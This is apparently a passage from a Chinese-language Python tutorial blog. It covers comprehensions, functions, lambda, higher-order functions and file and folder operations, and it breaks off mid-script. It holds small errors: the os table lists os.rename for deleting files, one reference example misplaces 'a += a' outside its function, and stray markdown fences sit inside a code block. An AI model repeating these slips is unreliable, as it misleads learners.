<li>简单的列表推导式<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list1 = [i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>)] </span><br><span class="line"><span class="built_in">print</span>(list1)  <span class="comment"># 创建⼀个0-10的列表。</span></span><br><span class="line"></span><br><span class="line">list2 = [i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">10</span>, <span class="number">2</span>)]  <span class="comment"># 创建一个 0-10 的偶数列表</span></span><br></pre></td></tr></table></figure></li>
<li>带if的列表推导式<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list1 = [i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>) <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span>]  <span class="comment"># 创建一个 0-10 的偶数列表</span></span><br></pre></td></tr></table></figure></li>
<li> 多个for循环实现列表推导式<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list1 = [(i, j) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">3</span>) <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line"><span class="comment"># [(1, 0), (1, 1), (1, 2), (2, 0), (2, 1), (2, 2)]</span></span><br></pre></td></tr></table></figure>
<h2 id="12-2-字典推导式"><a href="#12-2-字典推导式" class="headerlink" title="12.2 字典推导式"></a>12.2 字典推导式</h2>字典推导式作⽤：快速合并列表为字典或提取字典中⽬标数据。<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1. 创建⼀个字典：字典key是1-5数字，value是这个数字的2次⽅。</span></span><br><span class="line">dict1 = &#123;i: i**<span class="number">2</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">5</span>)&#125;</span><br><span class="line"><span class="built_in">print</span>(dict1) <span class="comment"># &#123;1: 1, 2: 4, 3: 9, 4: 16&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 将两个列表合并为⼀个字典</span></span><br><span class="line">list1 = [<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;age&#x27;</span>, <span class="string">&#x27;gender&#x27;</span>]</span><br><span class="line">list2 = [<span class="string">&#x27;Tom&#x27;</span>, <span class="number">20</span>, <span class="string">&#x27;man&#x27;</span>]</span><br><span class="line">dict1 = &#123;list1[i]: list2[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(list1))&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 提取字典中⽬标数据</span></span><br><span class="line">counts = &#123;<span class="string">&#x27;MBP&#x27;</span>: <span class="number">268</span>, <span class="string">&#x27;HP&#x27;</span>: <span class="number">125</span>, <span class="string">&#x27;DELL&#x27;</span>: <span class="number">201</span>, <span class="string">&#x27;Lenovo&#x27;</span>: <span class="number">199</span>, <span class="string">&#x27;acer&#x27;</span>: <span class="number">99</span>&#125;</span><br><span class="line">count1 = &#123;key: value <span class="keyword">for</span> key, value <span class="keyword">in</span> counts.items() <span class="keyword">if</span> value &gt;= <span class="number">200</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(count1) <span class="comment"># &#123;&#x27;MBP&#x27;: 268, &#x27;DELL&#x27;: 201&#125;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="12-3-集合推导式"><a href="#12-3-集合推导式" class="headerlink" title="12.3 集合推导式"></a>12.3 集合推导式</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list1 = [<span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>]</span><br><span class="line">set1 = &#123;i ** <span class="number">2</span> <span class="keyword">for</span> i <span class="keyword">in</span> list1&#125;</span><br><span class="line"><span class="built_in">print</span>(set1) <span class="comment"># &#123;1, 4&#125;</span></span><br></pre></td></tr></table></figure>

<h1 id="13-函数"><a href="#13-函数" class="headerlink" title="13. 函数"></a>13. 函数</h1><h2 id="13-1-语法"><a href="#13-1-语法" class="headerlink" title="13.1 语法"></a>13.1 语法</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> 函数名(<span class="params">参数</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot; 说明⽂档的位置 &quot;&quot;&quot;</span></span><br><span class="line">    code</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
<ul>
<li>查看函数说明文档<ul>
<li>help(func)</li>
</ul>
</li>
</ul>
<h2 id="13-2-变量作用域"><a href="#13-2-变量作用域" class="headerlink" title="13.2 变量作用域"></a>13.2 变量作用域</h2><ul>
<li>局部变量<ul>
<li>定义在函数体内部的变量，只在函数体内部⽣效。</li>
</ul>
</li>
<li>全局变量<ul>
<li>定义在函数体内、外都能⽣效的变量。</li>
</ul>
</li>
</ul>
<h2 id="13-3-函数的返回值"><a href="#13-3-函数的返回值" class="headerlink" title="13.3 函数的返回值"></a>13.3 函数的返回值</h2><ul>
<li>返回多个返回值<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">return_num</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>, <span class="number">2</span></span><br><span class="line"></span><br><span class="line">result = return_num()</span><br><span class="line"><span class="built_in">print</span>(result)  <span class="comment"># (1, 2)</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="13-4-函数参数"><a href="#13-4-函数参数" class="headerlink" title="13.4 函数参数"></a>13.4 函数参数</h2><ul>
<li>位置参数<ul>
<li>根据函数定义的位置来传递参数<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">user_info</span>(<span class="params">name, age, gender</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;您的名字是<span class="subst">&#123;name&#125;</span>, 年龄是<span class="subst">&#123;age&#125;</span>, 性别是<span class="subst">&#123;gender&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">user_info(<span class="string">&#x27;TOM&#x27;</span>, <span class="number">20</span>, <span class="string">&#x27;男&#x27;</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li>关键字参数<ul>
<li>通过“键=值”形式加以指定，可以让函数更加清晰、容易使⽤，同时也清除了参数的顺序需<br>求。</li>
<li>函数调⽤时，如果有位置参数时，<strong>位置参数必须在关键字参数的前⾯</strong>，但<strong>关键字参数之间不存在<br>先后顺序</strong>。<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">user_info</span>(<span class="params">name, age, gender</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;您的名字是<span class="subst">&#123;name&#125;</span>, 年龄是<span class="subst">&#123;age&#125;</span>, 性别是<span class="subst">&#123;gender&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">user_info(<span class="string">&#x27;Rose&#x27;</span>, age=<span class="number">20</span>, gender=<span class="string">&#x27;⼥&#x27;</span>)</span><br><span class="line">user_info(<span class="string">&#x27;⼩明&#x27;</span>, gender=<span class="string">&#x27;男&#x27;</span>, age=<span class="number">16</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li>缺省参数<ul>
<li>缺省参数也叫默认参数，⽤于定义函数，为参数提供默认值，调⽤函数时可不传该默认参数的值</li>
<li>所有位置参数必须出现在默认参数前，包括函数定义和调⽤<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">user_info</span>(<span class="params">name, age, gender=<span class="string">&#x27;男&#x27;</span></span>):</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;您的名字是<span class="subst">&#123;name&#125;</span>, 年龄是<span class="subst">&#123;age&#125;</span>, 性别是<span class="subst">&#123;gender&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">user_info(<span class="string">&#x27;TOM&#x27;</span>, <span class="number">20</span>)</span><br><span class="line">user_info(<span class="string">&#x27;Rose&#x27;</span>, <span class="number">18</span>, <span class="string">&#x27;⼥&#x27;</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li>不定⻓参数<ul>
<li>也叫可变参数。分为包裹(packing)位置参数，和包裹关键字参数。<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1. 包裹位置传参</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">user_info</span>(<span class="params">*args</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(args)</span><br><span class="line"></span><br><span class="line">user_info(<span class="string">&#x27;TOM&#x27;</span>)  <span class="comment"># (&#x27;TOM&#x27;,)</span></span><br><span class="line">user_info(<span class="string">&#x27;TOM&#x27;</span>, <span class="number">18</span>)  <span class="comment"># (&#x27;TOM&#x27;, 18)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 包裹关键字传参</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">user_info</span>(<span class="params">**kwargs</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(kwargs)</span><br><span class="line">   </span><br><span class="line">user_info(name=<span class="string">&#x27;TOM&#x27;</span>, age=<span class="number">18</span>, <span class="built_in">id</span>=<span class="number">110</span>)  <span class="comment"># &#123;&#x27;name&#x27;: &#x27;TOM&#x27;, &#x27;age&#x27;: 18, &#x27;id&#x27;: 110&#125;</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h2 id="13-5-拆包"><a href="#13-5-拆包" class="headerlink" title="13.5 拆包"></a>13.5 拆包</h2><ul>
<li>元组(tuple)拆包<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">return_num</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">100</span>, <span class="number">200</span></span><br><span class="line"></span><br><span class="line">num1, num2 = return_num()</span><br><span class="line"><span class="built_in">print</span>(num1)  <span class="comment"># 100</span></span><br><span class="line"><span class="built_in">print</span>(num2)  <span class="comment"># 200</span></span><br></pre></td></tr></table></figure></li>
<li>字典(dict)拆包<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">dict1 = &#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;TOM&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">18</span>&#125;</span><br><span class="line">a, b = dict1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 对字典进⾏拆包，取出来的是字典的key</span></span><br><span class="line"><span class="built_in">print</span>(a)  <span class="comment"># name</span></span><br><span class="line"><span class="built_in">print</span>(b)  <span class="comment"># age</span></span><br><span class="line"><span class="built_in">print</span>(dict1[a])  <span class="comment"># TOM</span></span><br><span class="line"><span class="built_in">print</span>(dict1[b])  <span class="comment"># 18</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="13-6-引用"><a href="#13-6-引用" class="headerlink" title="13.6 引用"></a>13.6 引用</h2><p>在python中，值是靠引⽤来传递来的。可以⽤ id() 来判断两个变量是否为同⼀个值的引⽤。</p>
<ul>
<li>引⽤当做实参<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test1</span>(<span class="params">a</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(a)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">id</span>(a))</span><br><span class="line"></span><br><span class="line">a += a</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">id</span>(a))</span><br><span class="line"></span><br><span class="line"><span class="comment"># int：计算前后id值不同</span></span><br><span class="line">b = <span class="number">100</span></span><br><span class="line">test1(b)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 列表：计算前后id值相同</span></span><br><span class="line">c = [<span class="number">11</span>, <span class="number">22</span>]</span><br><span class="line">test1(c)</span><br></pre></td></tr></table></figure>
<h2 id="13-7-可变和不可变类型"><a href="#13-7-可变和不可变类型" class="headerlink" title="13.7 可变和不可变类型"></a>13.7 可变和不可变类型</h2>所谓可变类型与不可变类型是指：数据能够直接进⾏修改，如果能直接修改那么就是可变，否则是不可变.</li>
<li>可变类型<ul>
<li>列表</li>
<li>字典</li>
<li>集合</li>
</ul>
</li>
<li>不可变类型<ul>
<li>整型</li>
<li>浮点型</li>
<li>字符串</li>
<li>元组</li>
</ul>
</li>
</ul>
<h2 id="13-8-lambda-表达式"><a href="#13-8-lambda-表达式" class="headerlink" title="13.8 lambda 表达式"></a>13.8 lambda 表达式</h2><p>如果⼀个函数有⼀个返回值，并且只有⼀句代码，可以使⽤ lambda简化。</p>
<h3 id="13-8-1-语法"><a href="#13-8-1-语法" class="headerlink" title="13.8.1 语法"></a>13.8.1 语法</h3><p>lambda 参数列表 ： 表达式</p>
<ul>
<li>lambda表达式的参数可有可⽆，函数的参数在lambda表达式中完全适⽤。</li>
<li>lambda表达式能接收任何数量的参数但只能返回⼀个表达式的值。<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># 函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fn1</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">200</span></span><br><span class="line"><span class="built_in">print</span>(fn1)  <span class="comment"># 内存地址</span></span><br><span class="line"><span class="built_in">print</span>(fn1())  <span class="comment"># 200</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># lambda表达式</span></span><br><span class="line">fn2 = <span class="keyword">lambda</span>: <span class="number">100</span></span><br><span class="line"><span class="built_in">print</span>(fn2)  <span class="comment"># 内存地址</span></span><br><span class="line"><span class="built_in">print</span>(fn2())  <span class="comment"># 100</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="13-8-2-参数形式"><a href="#13-8-2-参数形式" class="headerlink" title="13.8.2 参数形式"></a>13.8.2 参数形式</h3><ul>
<li>无参数<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fn1 = <span class="keyword">lambda</span>: <span class="number">100</span></span><br><span class="line"><span class="built_in">print</span>(fn1())  <span class="comment"># 100</span></span><br></pre></td></tr></table></figure></li>
<li>一个参数<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fn1 = <span class="keyword">lambda</span> a: a</span><br><span class="line"><span class="built_in">print</span>(fn1(<span class="string">&#x27;hello world&#x27;</span>))  <span class="comment"># hello world</span></span><br></pre></td></tr></table></figure></li>
<li>默认参数<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fn1 = <span class="keyword">lambda</span> a, b, c=<span class="number">100</span>: a + b + c</span><br><span class="line"><span class="built_in">print</span>(fn1(<span class="number">10</span>, <span class="number">20</span>))  <span class="comment"># 130 : 10+20+100</span></span><br></pre></td></tr></table></figure></li>
<li>可变参数：*args<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fn1 = <span class="keyword">lambda</span> *args: args</span><br><span class="line"><span class="built_in">print</span>(fn1(<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>))  <span class="comment"># (10,20,30) 元组</span></span><br></pre></td></tr></table></figure></li>
<li>可变参数：**kwargs<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">  fn1 = <span class="keyword">lambda</span> **kwargs: kwargs</span><br><span class="line">  <span class="built_in">print</span>(fn1(name=<span class="string">&#x27;python&#x27;</span>, age=<span class="number">20</span>))  <span class="comment"># &#123;&#x27;name&#x27;: &#x27;python&#x27;, &#x27;age&#x27;: 20&#125;</span></span><br><span class="line">  ```  </span><br><span class="line"><span class="comment">### 13.8.3 应用</span></span><br><span class="line">- 带判断的<span class="keyword">lambda</span></span><br><span class="line">  ```python</span><br><span class="line">  fn1 = <span class="keyword">lambda</span> a, b: a <span class="keyword">if</span> a &gt; b <span class="keyword">else</span> b</span><br><span class="line">  <span class="built_in">print</span>(fn1(<span class="number">1000</span>, <span class="number">500</span>))</span><br></pre></td></tr></table></figure></li>
<li>列表数据按字典key的值排序<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">students = [</span><br><span class="line">  &#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;TOM&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">20</span>&#125;,</span><br><span class="line">  &#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;ROSE&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">19</span>&#125;,</span><br><span class="line">  &#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;Jack&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">22</span>&#125;</span><br><span class="line">]</span><br><span class="line"><span class="comment"># 按name值升序排列</span></span><br><span class="line">students.sort(key=<span class="keyword">lambda</span> x: x[<span class="string">&#x27;name&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span>(students)  <span class="comment"># [&#123;&#x27;name&#x27;: &#x27;Jack&#x27;, &#x27;age&#x27;: 22&#125;, &#123;&#x27;name&#x27;: &#x27;ROSE&#x27;, &#x27;age&#x27;: 19&#125;, &#123;&#x27;name&#x27;: &#x27;TOM&#x27;, &#x27;age&#x27;: 20&#125;]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 按name值降序排列</span></span><br><span class="line">students.sort(key=<span class="keyword">lambda</span> x: x[<span class="string">&#x27;name&#x27;</span>], reverse=<span class="literal">True</span>)</span><br><span class="line"><span class="built_in">print</span>(students)  <span class="comment"># [&#123;&#x27;name&#x27;: &#x27;TOM&#x27;, &#x27;age&#x27;: 20&#125;, &#123;&#x27;name&#x27;: &#x27;ROSE&#x27;, &#x27;age&#x27;: 19&#125;, &#123;&#x27;name&#x27;: &#x27;Jack&#x27;, &#x27;age&#x27;: 22&#125;]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 按age值升序排列</span></span><br><span class="line">students.sort(key=<span class="keyword">lambda</span> x: x[<span class="string">&#x27;age&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span>(students)  <span class="comment"># [&#123;&#x27;name&#x27;: &#x27;ROSE&#x27;, &#x27;age&#x27;: 19&#125;, &#123;&#x27;name&#x27;: &#x27;TOM&#x27;, &#x27;age&#x27;: 20&#125;, &#123;&#x27;name&#x27;: &#x27;Jack&#x27;, &#x27;age&#x27;: 22&#125;]</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="13-9-内置高阶函数"><a href="#13-9-内置高阶函数" class="headerlink" title="13.9 内置高阶函数"></a>13.9 内置高阶函数</h2><ul>
<li>map()<ul>
<li>map(func, lst)，将传⼊的函数变量func作⽤到lst变量的每个元素中，并将结果组成新的列表(Python2)/迭代器(Python3)返回。<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list1 = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">return</span> x ** <span class="number">2</span></span><br><span class="line"></span><br><span class="line">result = <span class="built_in">map</span>(func, list1)</span><br><span class="line"><span class="built_in">print</span>(result) <span class="comment"># &lt;map object at 0x0000013769653198&gt;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(result)) <span class="comment"># [1, 4, 9, 16, 25]</span></span><br><span class="line"><span class="comment"># 注意 result 经过 list 类型转换后，result 变为空</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li>reduce()<ul>
<li>reduce(func，lst)，其中func必须有两个参数。每次func计算的结果继续和序列的下⼀个元素做累积计算。<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> functools</span><br><span class="line"></span><br><span class="line">list1 = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span>(<span class="params">a, b</span>):</span>  <span class="comment"># 上一次函数执行的结果会当作参数传递到下一次的函数（参数 a）</span></span><br><span class="line">    <span class="keyword">return</span> a + b</span><br><span class="line"></span><br><span class="line">result = functools.reduce(func, list1)</span><br><span class="line"><span class="built_in">print</span>(result)  <span class="comment"># 15</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li>filter()<ul>
<li>filter(func, lst)函数⽤于过滤序列, 过滤掉不符合条件的元素, 返回⼀个 filter 对象。如果要转换为列表,可以使⽤ list() 来转换。<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list1 = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">return</span> x % <span class="number">2</span> == <span class="number">0</span></span><br><span class="line"></span><br><span class="line">result = <span class="built_in">filter</span>(func, list1)</span><br><span class="line"><span class="built_in">print</span>(result)  <span class="comment"># 内存地址</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(result))  <span class="comment"># [2, 4, 6, 8, 10]</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h1 id="14-文件操作"><a href="#14-文件操作" class="headerlink" title="14. 文件操作"></a>14. 文件操作</h1><h2 id="14-1-打开模式"><a href="#14-1-打开模式" class="headerlink" title="14.1 打开模式"></a>14.1 打开模式</h2><p>在python，使⽤open函数，可以打开⼀个已经存在的⽂件，或者创建⼀个新⽂件，语法如下：</p>
<blockquote>
<p>open(name, mode)</p>
<ul>
<li>name：是要打开的⽬标⽂件名的字符串(可以包含⽂件所在的具体路径)。</li>
<li>mode：设置打开⽂件的模式(访问模式)：只读、写⼊、追加等。</li>
</ul>
</blockquote>
<table>
<thead>
<tr>
<th>模式</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>r</td>
<td>以只读⽅式打开⽂件。⽂件的指针将会放在⽂件的开头。这是默认模式。</td>
</tr>
<tr>
<td>rb</td>
<td>以⼆进制格式打开⼀个⽂件⽤于只读。⽂件指针将会放在⽂件的开头。这是默认模式。</td>
</tr>
<tr>
<td>r+</td>
<td>打开⼀个⽂件⽤于读写。⽂件指针将会放在⽂件的开头。</td>
</tr>
<tr>
<td>rb+</td>
<td>以⼆进制格式打开⼀个⽂件⽤于读写。⽂件指针将会放在⽂件的开头。</td>
</tr>
<tr>
<td>w</td>
<td>打开⼀个⽂件只⽤于写⼊。如果该⽂件已存在则打开⽂件，并从开头开始编辑，即原有内容会被删除。如果该⽂件不存在，创建新⽂件。</td>
</tr>
<tr>
<td>wb</td>
<td>以⼆进制格式打开⼀个⽂件只⽤于写⼊。如果该⽂件已存在则打开⽂件，并从开头开始编辑，即原有内容会被删除。如果该⽂件不存在，创建新⽂件。</td>
</tr>
<tr>
<td>w+</td>
<td>打开⼀个⽂件⽤于读写。如果该⽂件已存在则打开⽂件，并从开头开始编辑，即原有内容会被删除。如果该⽂件不存在，创建新⽂件。</td>
</tr>
<tr>
<td>wb+</td>
<td>以⼆进制格式打开⼀个⽂件⽤于读写。如果该⽂件已存在则打开⽂件，并从开头开始编辑，即原有内容会被删除。如果该⽂件不存在，创建新⽂件。</td>
</tr>
<tr>
<td>a</td>
<td>打开⼀个⽂件⽤于追加。如果该⽂件已存在，⽂件指针将会放在⽂件的结尾。也就是说，新的内容将会被写⼊到已有内容之后。如果该⽂件不存在，创建新⽂件进⾏写⼊。</td>
</tr>
<tr>
<td>ab</td>
<td>以⼆进制格式打开⼀个⽂件⽤于追加。如果该⽂件已存在，⽂件指针将会放在⽂件的结尾。也就是说，新的内容将会被写⼊到已有内容之后。如果该⽂件不存在，创建新⽂件进⾏写⼊。</td>
</tr>
<tr>
<td>a+</td>
<td>打开⼀个⽂件⽤于读写。如果该⽂件已存在，⽂件指针将会放在⽂件的结尾。⽂件打开时会是追加模式。如果该⽂件不存在，创建新⽂件⽤于读写。ab+ 以⼆进制格式打开⼀个⽂件⽤于追加。如果该⽂件已存在，⽂件指针将会放在⽂件的结尾。如果该⽂件不存在，创建新⽂件⽤于读写。</td>
</tr>
</tbody></table>
<h2 id="14-2-⽂件对象⽅法"><a href="#14-2-⽂件对象⽅法" class="headerlink" title="14.2 ⽂件对象⽅法"></a>14.2 ⽂件对象⽅法</h2><h3 id="14-2-1-写"><a href="#14-2-1-写" class="headerlink" title="14.2.1 写"></a>14.2.1 写</h3><blockquote>
<p>对象.write(‘内容’)</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1. 打开⽂件</span></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;test.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.⽂件写⼊</span></span><br><span class="line">f.write(<span class="string">&#x27;hello world&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 关闭⽂件</span></span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>
<blockquote>
<p>注意：</p>
<ol>
<li>w 和 a 模式：如果⽂件不存在则创建该⽂件；如果⽂件存在， w 模式先清空再写⼊， a 模式直接末尾追加。</li>
<li>r 模式：如果⽂件不存在则报错。</li>
</ol>
</blockquote>
<h3 id="14-2-2-读"><a href="#14-2-2-读" class="headerlink" title="14.2.2 读"></a>14.2.2 读</h3><ul>
<li>read()<ul>
<li>⽂件对象.read(num), num表示要从⽂件中读取的数据的⻓度（单位是字节），如果没有传⼊num，那么就表示读取⽂件中所有的数据。</li>
</ul>
</li>
<li>readlines()<ul>
<li>readlines可以按照⾏的⽅式把整个⽂件中的内容进⾏⼀次性读取，并且返回的是⼀个列表，其中每⼀⾏的数据为⼀个元素。  </li>
</ul>
</li>
<li>readline()<ul>
<li>⼀次读取⼀⾏内容。</li>
</ul>
</li>
<li>seek()<ul>
<li>⽂件对象.seek(偏移量, 起始位置)。⽤来移动⽂件指针。<ul>
<li>0：⽂件开头</li>
<li>1：当前位置</li>
<li>2：⽂件结尾</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="14-3-文件备份"><a href="#14-3-文件备份" class="headerlink" title="14.3 文件备份"></a>14.3 文件备份</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">old_name = <span class="built_in">input</span>(<span class="string">&#x27;请输⼊您要备份的⽂件名：&#x27;</span>)</span><br><span class="line">index = old_name.rfind(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> index &gt; <span class="number">0</span>:</span><br><span class="line">    postfix = old_name[index:]</span><br><span class="line"></span><br><span class="line">new_name = old_name[:index] + <span class="string">&#x27;[备份]&#x27;</span> + postfix</span><br><span class="line"></span><br><span class="line">old_f = <span class="built_in">open</span>(old_name, <span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">new_f = <span class="built_in">open</span>(new_name, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    con = old_f.read(<span class="number">1024</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(con) == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    new_f.write(con)</span><br><span class="line"></span><br><span class="line">old_f.close()</span><br><span class="line">new_f.close()</span><br></pre></td></tr></table></figure>

<h2 id="14-4-⽂件和⽂件夹的操作"><a href="#14-4-⽂件和⽂件夹的操作" class="headerlink" title="14.4 ⽂件和⽂件夹的操作"></a>14.4 ⽂件和⽂件夹的操作</h2><p>在Python中⽂件和⽂件夹的操作要借助os模块⾥⾯的相关功能</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>函数</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>os.rename(⽬标⽂件名, 新⽂件名)</td>
<td>⽂件重命名</td>
</tr>
<tr>
<td>os.rename(⽬标⽂件名, 新⽂件名)</td>
<td>删除⽂件</td>
</tr>
<tr>
<td>os.mkdir(⽂件夹名字)</td>
<td>创建⽂件夹</td>
</tr>
<tr>
<td>os.rmdir(⽂件夹名字)</td>
<td>删除⽂件夹</td>
</tr>
<tr>
<td>os.getcwd()</td>
<td>获取当前⽬录</td>
</tr>
<tr>
<td>os.chdir(⽬录)</td>
<td>改变默认⽬录</td>
</tr>
<tr>
<td>os.listdir(⽬录)</td>
<td>获取⽬录列表</td>
</tr>
</tbody></table>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="comment"># 设置重命名标识：如果为1则添加指定字符，flag取值为2则删除指定字符</span></span><br><span class="line">flag = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取指定⽬录</span></span><br><span class="line">dir_name = <span class="string">&#x27;./&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取指定⽬录的⽂件列表</span></span><br><span class="line">file_list = os.listdir(dir_name)</span><br><span class="line"><span class="comment"># print(file_list)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 遍历⽂件列表内的⽂件</span></span><br><span class="line"><span class="keyword">for</span> name <span class="keyword">in</span> file_list:</span><br><span class="line">    <span class="comment"># 添加指定字符</span></span><br><span class="line">    <span class="keyword">if</span> 